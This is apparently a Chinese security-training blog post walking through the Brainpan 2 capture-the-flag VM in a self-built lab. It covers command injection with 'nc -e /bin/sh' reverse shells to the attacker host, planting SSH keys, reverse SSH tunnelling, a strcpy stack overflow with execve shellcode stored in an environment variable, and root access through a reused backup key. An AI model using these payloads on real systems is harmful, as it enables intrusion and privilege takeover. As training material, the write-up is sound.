## 系列文章

> [专辑：渗透测试之地基篇](https://www.freebuf.com/column/1998)

## 简介

 **渗透测试-地基篇**

该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。

 **请注意** ：

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

名言：

你对这行的兴趣，决定你在这行的成就！

## 一、前言

缓冲区溢出（buffer
overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。

项目五十一：brainpan-2，考验了缓冲区溢出知识和两次二进制程序命令注入漏洞问题，该项目存在非常多的知识点，存在msg_root、brainpan.exe、brainpan-1.8.exe文件，该项目是Linux环境运行着二进制文件，该文件是一个计算器程序，该环境就和AWD中的PWN题目一样，直播教学会有多种方法详细解释如何理解缓冲区溢出，如何发现缓冲区溢出，遇到缓冲区溢出如何利用，栈是什么等等问题详解。

接下来我讲分享其中方法一给到各位小伙伴学习，欢迎大佬！

## 二、项目介绍

该项目存在非常多的知识点和防护手段，需要很强的基础知识和渗透手段才可以攻破拿到该服务器权限，一路旅程从：

    
    
    外网信息收集->命令注入攻击->SSH隧道代理->缓冲区溢出->命令注入漏洞->对比rsa+复用提权
    

才到咱们本章最有意思的格式字符串缓冲区溢出点，当然前面的逻辑贯穿能力也不可缺失，接下来将详细介绍格式字符串缓冲区如何溢出提权的，在栈空间中遨游！  
![1652333497_627c9bb9708493e1f877c.png!small?1652333498667](https://image.3001.net/images/20220512/1652333497_627c9bb9708493e1f877c.png!small?1652333498667)  
通过外网信息收集->命令注入攻击写入nc反弹的shell代码并反弹，获得反弹anansi用户的反弹shell，进入了缓冲区的世界内，今天仅仅讲解缓冲区溢出，让各位学到更多，接下来是通过提权拿到了该普通用户权限！

## 三、命令注入攻击

Command
Injection，即命令注入攻击，是指由于嵌入式应用程序或者web应用程序对用户提交的数据过滤不严格，导致黑客可以通过构造特殊命令字符串的方式，将数据提交至应用程序中，并利用该方式执行外部程序或系统命令实施攻击，非法获取数据或者网络资源等。

接下来分析nmap发现开启的9999端口上的二进制程序：  
![1652333505_627c9bc12b92f5634241f.png!small?1652333507562](https://image.3001.net/images/20220512/1652333505_627c9bc12b92f5634241f.png!small?1652333507562)  
发现来宾用户提示，输入存在提示命令：

    
    
    TELL ME MORE
    

![1652333512_627c9bc893f155fe9ddd9.png!small?1652333513685](https://image.3001.net/images/20220512/1652333512_627c9bc893f155fe9ddd9.png!small?1652333513685)  
可看到有很多命令：

    
    
    FILES    HELP    VIEW       CREATE
        USERS    MSG     SYSTEM     BYE
    

HELP尝试查看帮助：  
![1652333519_627c9bcf6815ae80bd021.png!small?1652333543617](https://image.3001.net/images/20220512/1652333519_627c9bcf6815ae80bd021.png!small?1652333543617)  
给出了提示：

    
    
    FILES 显示当前存储在服务器上的文件
    VIEW 查看存储在服务器上的文件
    CREATE 在服务器上创建一个文件
    USERS 显示当前登录的用户列表
    MSG 向用户发送消息
    SYSTEM 报告系​​统信息
    BYE 退出服务器
    

提示说DEBUG帐户会改变一些命令的输出，该用户主要供给开发人员使用的！虽然无法从GUEST以DEBUG身份登录，但可以直接以DEBUG身份登录！  
![1652333523_627c9bd33959fbb8909a3.png!small?1652333543617](https://image.3001.net/images/20220512/1652333523_627c9bd33959fbb8909a3.png!small?1652333543617)

    
    
    DEBUG
    TELL ME MORE
    SYSTEM   ---查看系统配置信息
    

DEBUG用户权限是存在权限高的情况！查看到了系统的配置情况信息！

    
    
    FILES
    VIEW    ---提示输入要读取的文件
    

![1652333532_627c9bdce45036dd8d208.png!small?1652333555568](https://image.3001.net/images/20220512/1652333532_627c9bdce45036dd8d208.png!small?1652333555568)  
查看文件内容，发现日志信息，查看日志信息发现了一些版本上的对于漏洞缺陷更新新版本后修补的提示。

尝试命令注入攻击：  
![1652333536_627c9be04d7ade0001a3c.png!small?1652333562679](https://image.3001.net/images/20220512/1652333536_627c9be04d7ade0001a3c.png!small?1652333562679)  
反弹shell：

    
    
    nc -vlp 443   ---kali开启本地监听
    VIEW
    ; nc -e /bin/sh 192.168.253.138 443
    python -c 'import pty; pty.spawn("/bin/bash")'
    

![1652333541_627c9be580a91745f09fd.png!small?1652333562679](https://image.3001.net/images/20220512/1652333541_627c9be580a91745f09fd.png!small?1652333562679)  
可看到通过命令注入攻击的id尝试，该程序缺陷存在命令注入漏洞，利用该漏洞执行nc反弹shell，在本地kali获得交互shell，并建立稳定的shell过程。

## 四、SSH隧道代理

ssh隧道代理是方便远程访问服务器的功能，分本地连接，远程连接。远程连接是在无法直接访问到，需要通过中间机器访问的那台机器上执行建立ssh隧道的命令，对于执行建立隧道的机器来说，是开通一个远程端口来监听需要转发的请求。

### 1、植入ssh_rsa

![1652333548_627c9bec9a8fbd925f350.png!small?1652333562680](https://image.3001.net/images/20220512/1652333548_627c9bec9a8fbd925f350.png!small?1652333562680)

    
    
    echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQClZ9XohIbutckLL0va8BgtyVHKQpNp3pHFearQZhIHCjwAM7VLYoO0qR2OIRaKWbGE8nnMjL23tuZqh738wy3UE6G7fglPT/pfufutajV1rxe01oofFpzsqpz3ddutDnJNfKQSKwibQBS6D9uySO3WIFWriz3n/kcx0RnbIspd9dNU5Spqv5aQtbjf6wdgKWwtDiJoP3GWK28rrIExtx43Ygd6YGEftWCWacucmZ6mCfXTsjoftnzlbRkO+/8Ng2wz4jScZEJ6M6m/oRIN3I608VUeyY2KeBr5EEMALa8FZPH5PWx5Ztg9NZIGDR78fRDy42nTKpc60ZgI07rlJvfb33wLggZDthuN4HfKliGFJd1/4U2mH6J9qqFPHzkRZDKhh615YWznB4nPXH3vzgQLSSEQzLsDHD3OIeMXm5Aa8dE9iJsUwjb7x1bv4m6VdQuDrH6SiSXg3UfOEuWokJqhg/q8MvxIuRfJK26N9BxEYfpTKrc7YIYmG+k45f5J7U= root@kali' > authorized_keys
    

写入authorized_keys文件到.ssh文件夹内，接下来直接连接建立即可！

### 2、SSH隧道

由于查看本地开启的2222端口ssh服务，并未映射到外网环境进行登录，接下来通过ssh对本地的2222端口进行端口转发建立隧道代理工作过程：

![1652333568_627c9c00e141dd6cf24ef.png!small?1652333593998](https://image.3001.net/images/20220512/1652333568_627c9c00e141dd6cf24ef.png!small?1652333593998)

    
    
    kali开启ssh：/etc/init.d/ssh restart
    ssh root@192.168.253.138 -R 7788:127.0.1.1:2222
    

可看到开启了ssh的端口转发！

如果无法建立kali上的ssh隧道代理，需要这么进行配置：  
![1652333571_627c9c031c9ed88d2bd95.png!small?1652333582038](https://image.3001.net/images/20220512/1652333571_627c9c031c9ed88d2bd95.png!small?1652333582038)  
配置完成后即可在项目环境和本地kali建立代理！

    
    
    cd ~/.ssh
    ssh anansi@localhost -p 7788
    

![1652333576_627c9c084384725361d68.png!small?1652333593998](https://image.3001.net/images/20220512/1652333576_627c9c084384725361d68.png!small?1652333593998)  
通过ssh对本地的2222端口转发到kali本地的7788端口进行建立隧道，成功建立后在本地kali用7788端口即可使用ssh服务登录到项目环境内部，获得稳定的ssh交互shell！

## 五、缓冲区溢出

接下来通过内部信息收集，针对程序设计缺陷进行逆向分析，并开启缓冲区溢出之旅！

### 1、内部信息收集

良好的内部信息收集能力，是对接下来的渗透过程一个有力的支撑点，有了好的信息才能有好的突破！

    
    
    find / -perm -4000 2>/dev/null
    

![1652333582_627c9c0e42d7e2b1dc8c7.png!small?1652333593998](https://image.3001.net/images/20220512/1652333582_627c9c0e42d7e2b1dc8c7.png!small?1652333593998)  
通过查看SUID权限的文件，发现存在msg_root程序信息，开始分析！

### 2、验证其功能性

![1652333585_627c9c1115566f3e6387d.png!small?1652333593995](https://image.3001.net/images/20220512/1652333585_627c9c1115566f3e6387d.png!small?1652333593995)

    
    
    ./msg_root
    usage: msg_root username message
    

根据readme.txt的提示继续尝试：

    
    
    ./msg_root "dayu" "dayu"
    

![1652333589_627c9c156f4563e1eac45.png!small?1652333593997](https://image.3001.net/images/20220512/1652333589_627c9c156f4563e1eac45.png!small?1652333593997)  
可看到和readme提示一样，会在tmp目录下记录执行的内容！

### 3、查看是否存在缓冲区溢出

缓冲区溢出分为栈溢出、堆溢出、格式字符串溢出，目前仅仅测试了最基础的溢出手法，来看看该程序的函数主体，将用到GDB！

gdb是GNU开源组织发布的一个强大的Linux下的程序调试工具，逆向分析有非常多好用的工具，但是GDB毋庸置疑是最强之一，它的pwndbg和peda插件那就是辅助GDB上神器行列的最强帮手。

前面我讲解的项目经验都用到了python，这里将使用perl进行探测！

![1652333596_627c9c1c4abd5e9e96acb.png!small?1652333596740](https://image.3001.net/images/20220512/1652333596_627c9c1c4abd5e9e96acb.png!small?1652333596740)

    
    
    ./msg_root $(perl -e 'print "A"x100') dayu
    Segmentation fault
    

报字段错误崩溃，发现在第一个字符处存在缓冲区溢出！

 **gdb逆向分析：**

![1652333607_627c9c27e6e4936dfa8d6.png!small?1652333623981](https://image.3001.net/images/20220512/1652333607_627c9c27e6e4936dfa8d6.png!small?1652333623981)

    
    
    gdb ./msg_root
    disassemble main
    0x08048776 <+59>:   call   0x80486a1 <get_name>
    

看到对 <get_name> 函数的调用！继续往下查看分析：  
![1652333616_627c9c304304affdc3016.png!small?1652333624615](https://image.3001.net/images/20220512/1652333616_627c9c304304affdc3016.png!small?1652333624615)

    
    
    disassemble 0x80486a1
    0x080486cb <+42>:   call   0x80484b0 <strcpy@plt>
    

这个strcpy函数将用户的命令行输入复制到一个变量中，strcpy是一个众所周知的缓冲区溢出漏洞！

### 4、查找偏移量

1）利用pattern_create.rb生成100位随机数值

![1652333622_627c9c366129a25a26b40.png!small?1652333624615](https://image.3001.net/images/20220512/1652333622_627c9c366129a25a26b40.png!small?1652333624615)

    
    
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    

2）gdb执行输入100位随机数

![1652333627_627c9c3be5fa3a2e0920d.png!small?1652333632909](https://image.3001.net/images/20220512/1652333627_627c9c3be5fa3a2e0920d.png!small?1652333632909)

    
    
    gdb ./msg_root
    r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A dayu
    0x35614134
    

获得栈溢出后下一位的栈空间地址：0x35614134

3）EIP查看偏移量

![1652333630_627c9c3e242dba3f523a4.png!small?1652333632908](https://image.3001.net/images/20220512/1652333630_627c9c3e242dba3f523a4.png!small?1652333632908)

    
    
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35614134                                                                         
    [*] Exact match at offset 14
    

利用offset.rb发现偏移量为14！

### 5、测试偏移量覆盖

![1652333636_627c9c442efeca8e6a0e9.png!small?1652333643583](https://image.3001.net/images/20220512/1652333636_627c9c442efeca8e6a0e9.png!small?1652333643583)

    
    
    gdb ./msg_root
    run $(perl -e 'print "A"x14 . "B"x4 . "C"x100') dayu
    i r
    eip            0x42424242   0x42424242
    

可看到EIP已经被B给覆盖！那么接下来就可以对覆盖的位置进行shellcode写入利用！

### 6、验证安全ASLR

地址空间随机化(Address Space Layout
Randomization)（ASLR）是一种操作系统用来抵御缓冲区溢出攻击的内存保护机制。这种技术使得系统上运行的进程的内存地址无法被预测，使得与这些进程有关的漏洞变得更加难以利用。

ASLR验证：  
![1652333640_627c9c4851dbb9fa9dddf.png!small?1652333643582](https://image.3001.net/images/20220512/1652333640_627c9c4851dbb9fa9dddf.png!small?1652333643582)

    
    
    cat /proc/sys/kernel/randomize_va_space
    0
    
    0 = 关闭
    1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（留坑，PIE会影响heap的随机化。。）
    2 = 全随机。除了1中所述，还有heap。
    

在root未开启ASLR！

### 7、shellcode定位

这里可以根据**《红队项目PinkysPalace格式字符串缓冲区溢出详解》**思路来进行定位环境内存地址！  
![1652333645_627c9c4d2290057fc3750.png!small?1652333646167](https://image.3001.net/images/20220512/1652333645_627c9c4d2290057fc3750.png!small?1652333646167)

    
    
    http://shell-storm.org/shellcode/files/shellcode-811.php   ---这里使用811，827不行！
    
    char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                       "\x68\x68\x2f\x62\x69\x6e\x89"
                       "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                       "\xcd\x80\x31\xc0\x40\xcd\x80";
    

把核心shellcode拿出，利用缓冲区漏洞另外的技巧思路，将shell代码放在环境变量中，并将程序流重定向到环境变量的地址即可！

将偏移量移到/tmp目录中，并对其进行排序，用python写入：

    
    
    export DAYU=`python -c 'print "\x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'`
    

![1652333651_627c9c53b1bdb869f8a83.png!small?1652333652622](https://image.3001.net/images/20220512/1652333651_627c9c53b1bdb869f8a83.png!small?1652333652622)

### 8、定位环境变量的地址

当环境变量中植入shellcode后，需要找到覆盖覆盖函数的地址！  
植入shellcode需要找到地址该脚本可以找：

    
    
    https://raw.githubusercontent.com/Partyschaum/haxe/master/getenvaddr.c
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    
    int main(int argc, char *argv[]) {
        char *ptr;
    
        if(argc < 3) {
            printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
            exit(0);
        }
        ptr = getenv(argv[1]); /* get env var location */
        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
        printf("%s will be at %p\n", argv[1], ptr);
    }
    

将保存到：getenvaddr.c  
![1652333658_627c9c5adc887022a988f.png!small?1652333670506](https://image.3001.net/images/20220512/1652333658_627c9c5adc887022a988f.png!small?1652333670506)

    
    
    nano getenvaddr.c
    gcc -o getenvaddr getenvaddr.c
    

文件上传：  
![1652333661_627c9c5d7aee315dce1a0.png!small?1652333670507](https://image.3001.net/images/20220512/1652333661_627c9c5d7aee315dce1a0.png!small?1652333670507)

    
    
    python -m SimpleHTTPServer 8081
    wget http://192.168.253.138:8081/getenvaddr -O /tmp/getenvaddr
    chmod +x /tmp/getenvaddr
    

尝试运行：

    
    
    ./getenvaddr 
    

![1652333664_627c9c60a25c1d3dab899.png!small?1652333670507](https://image.3001.net/images/20220512/1652333664_627c9c60a25c1d3dab899.png!small?1652333670507)

注意！！！这里项目环境是32位的linux系统，没有安装gcc需要本地32位的kali进行编译！重新linux-32编译后重新上传运行：  
![1652333668_627c9c645121c67b34bc3.png!small?1652333670508](https://image.3001.net/images/20220512/1652333668_627c9c645121c67b34bc3.png!small?1652333670508)

成功运行！前面已经将shellcode放入环境变量中了，现在可以使用DAYU在执行目标二进制文件期间找到环境变量在内存中的位置：  
![1652333672_627c9c682cb064a3a573e.png!small?1652333672662](https://image.3001.net/images/20220512/1652333672_627c9c682cb064a3a573e.png!small?1652333672662)

    
    
    /tmp/getenvaddr DAYU ./msg_root
    SPAWN will be at 0xbfffffb7
    

这时候获得要覆盖的内存地址：0xbfffffb7

### 9、调用偏移量跳入内存环境植入的shellcode

![1652333676_627c9c6c354cdc2338104.png!small?1652333676892](https://image.3001.net/images/20220512/1652333676_627c9c6c354cdc2338104.png!small?1652333676892)

    
    
    ./msg_root $(perl -e 'print "A"x14 . "\xb7\xff\xff\xbf"') dayu
    

成功获得root权限，但是UID和GID感觉不对，提示euid=104(root)
groups=106(root)，root作为最高权限用户uid和gid应该为0：0！

![1652333679_627c9c6fe2b8ff5f72258.png!small?1652333680681](https://image.3001.net/images/20220512/1652333679_627c9c6fe2b8ff5f72258.png!small?1652333680681)

    
    
    root:x:104:106:root:/root:/bin/bash
    root :x:0:0:root:/var/root:/bin/bash
    

在内部信息收集发现两个root账号，一个root一个多一个空格的root！

## 六、命令注入漏洞

### 1、内部信息收集

    
    
    find / -perm -4000 2>/dev/null
    

![1652333685_627c9c75391bb5ee147e6.png!small?1652333686793](https://image.3001.net/images/20220512/1652333685_627c9c75391bb5ee147e6.png!small?1652333686793)  
进入目录查看：  
![1652333688_627c9c78b5567ab89cef4.png!small?1652333690027](https://image.3001.net/images/20220512/1652333688_627c9c78b5567ab89cef4.png!small?1652333690027)

    
    
    cat brainpan.cfg
    

![1652333691_627c9c7bc4f0a0e64b61b.png!small?1652333692205](https://image.3001.net/images/20220512/1652333691_627c9c7bc4f0a0e64b61b.png!small?1652333692205)  
只允许本地访问，端口为：9333！

### 2、修改配置信息

通过信息收集查看到配置文件仅仅允许本地的127.0.0.1开启，将其改为全局路由模式即可！

    
    
    echo "port=9333\nipaddr=0.0.0.0" > brainpan.cfg
    cat brainpan.cfg
    

![1652333704_627c9c88c93c8b8414b0d.png!small?1652333705728](https://image.3001.net/images/20220512/1652333704_627c9c88c93c8b8414b0d.png!small?1652333705728)  
修改成功！

### 3、命令注入

 **1）运行**

命令注入前需要运行该程序，将该端口服务启动起来，在外网能够探测到！  
![1652333716_627c9c94d1d013289f138.png!small?1652333729260](https://image.3001.net/images/20220512/1652333716_627c9c94d1d013289f138.png!small?1652333729260)  
nmap探测发现9333端口！

 **2）命令注入反弹shell**

通过探测到后，开始和最前面的注入命令一直操作即可！

![1652333722_627c9c9a8bf64d70f7b56.png!small?1652333745269](https://image.3001.net/images/20220512/1652333722_627c9c9a8bf64d70f7b56.png!small?1652333745269)

    
    
    telnet 192.168.253.231 9333
    GUEST
    TELL ME MORE
    VIEW
    a; nc -e /bin/sh 192.168.253.138 4444   ---这里加入个信息a即可！
    

成功拿到puck的shell！但是拿到的shell很不稳定！

### 4、植入ssh_rsa

![1652333729_627c9ca13b66d519e5125.png!small?1652333745270](https://image.3001.net/images/20220512/1652333729_627c9ca13b66d519e5125.png!small?1652333745270)

    
    
    cd /home/puck/.ssh
    
    echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQClZ9XohIbutckLL0va8BgtyVHKQpNp3pHFearQZhIHCjwAM7VLYoO0qR2OIRaKWbGE8nnMjL23tuZqh738wy3UE6G7fglPT/pfufutajV1rxe01oofFpzsqpz3ddutDnJNfKQSKwibQBS6D9uySO3WIFWriz3n/kcx0RnbIspd9dNU5Spqv5aQtbjf6wdgKWwtDiJoP3GWK28rrIExtx43Ygd6YGEftWCWacucmZ6mCfXTsjoftnzlbRkO+/8Ng2wz4jScZEJ6M6m/oRIN3I608VUeyY2KeBr5EEMALa8FZPH5PWx5Ztg9NZIGDR78fRDy42nTKpc60ZgI07rlJvfb33wLggZDthuN4HfKliGFJd1/4U2mH6J9qqFPHzkRZDKhh615YWznB4nPXH3vzgQLSSEQzLsDHD3OIeMXm5Aa8dE9iJsUwjb7x1bv4m6VdQuDrH6SiSXg3UfOEuWokJqhg/q8MvxIuRfJK26N9BxEYfpTKrc7YIYmG+k45f5J7U= root@kali' > authorized_keys
    
    ssh puck@localhost -p 7788
    

和前面方法一直写入key获得一个稳定的shell！

## 七、对比rsa+复用提权

### 1、内部信息收集

![1652333733_627c9ca5e270f6fe8e15e.png!small?1652333753106](https://image.3001.net/images/20220512/1652333733_627c9ca5e270f6fe8e15e.png!small?1652333753106)  
可看到在/home/puck目录下发现该用户的历史记录信息！diff进行比较！

### 2、比较rsa文件

diff，计算机术语，该命令用来比较文本文件。

![1652333737_627c9ca93b01c0718ae12.png!small](https://image.3001.net/images/20220512/1652333737_627c9ca93b01c0718ae12.png!small)

    
    
    diff -q ~/.ssh/id_rsa ~/.backup/.ssh/id_rsa
    

对比发现两个文件夹中的.ssh的私钥都不同！使用此备份密钥以root身份进行ssh：谨记这里root用户有空格：

    
    
    cd /home/puck/.backup/.ssh
    ssh -l "root " 127.0.1.1 -p 2222 -i id_rsa
    

![1652333742_627c9cae222c1a7062112.png!small?1652333753108](https://image.3001.net/images/20220512/1652333742_627c9cae222c1a7062112.png!small?1652333753108)

You've completed the Brainpan 2 challenge!！ ---成功完成挑战！

## 八、经验总结

今天学到命令注入攻击->SSH隧道代理->缓冲区溢出->命令注入漏洞->对比rsa+复用提权的过程，其中包含了命令注入分析、注入nc反弹shell、ssh隧道建立、perl测试缓冲区溢出、python
export环境变量植shellcode、ASLR安全验证、跳入内存环境拿shell、命令注入配置修改、命令注入反弹shell、diff对比rsa、复用rsa拿到root最终提权等等操作，最后远程代码执行控制服务器等操作，学到了非常多的小技巧和干货，希望小伙伴能实际操作复现一遍！来巩固告知企业单位的漏洞情况，并尽快进行加固巩固安全！

希望大家提高安全意识，没有网络安全就没有国家安全！

今天基础牢固就到这里，虽然基础，但是必须牢记于心。

作者：大余

